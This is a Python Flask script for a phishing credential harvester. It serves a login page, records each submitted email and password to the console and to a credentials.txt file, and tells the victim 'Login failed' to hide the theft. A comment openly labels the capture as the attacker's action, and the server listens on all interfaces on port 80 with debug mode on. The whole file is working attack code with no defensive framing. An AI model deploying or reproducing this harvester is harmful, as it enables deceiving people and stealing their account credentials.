#!/usr/bin/env python3
from flask import Flask, request, render_template_string, redirect
import os

# Initialize the Flask application
app = Flask(__name__)

# Define the path for the HTML file and the credentials log file
HTML_FILE_PATH = os.path.join(os.path.dirname(__file__), 'index.html')
CREDENTIALS_FILE_PATH = os.path.join(os.path.dirname(__file__), 'credentials.txt')

# Route for the main page ('/')
@app.route('/')
def home():
    """Serves the login page."""
    try:
        with open(HTML_FILE_PATH, 'r') as f:
            html_content = f.read()
        return render_template_string(html_content)
    except FileNotFoundError:
        return "Error: index.html not found.", 404

# Route for handling the login form submission
@app.route('/login', methods=['POST'])
def login():
    """Captures the submitted credentials."""
    # Get email and password from the form
    email = request.form.get('email')
    password = request.form.get('password')

    # --- Attacker's Action: Print and Save Credentials ---
    print("\n[+] Credentials Captured!")
    print(f"    Email: {email}")
    print(f"    Password: {password}\n")

    # Save the credentials to a file
    with open(CREDENTIALS_FILE_PATH, 'a') as f:
        f.write(f"Email: {email}, Password: {password}\n")

    # Optional: Redirect the user to a fake "login failed" page or back to the login
    return "Login failed. Please try again."

if __name__ == '__main__':
    # Run the Flask app on all available network interfaces on port 80
    # 'sudo' is required to run on port 80
    app.run(host='0.0.0.0', port=80, debug=True)
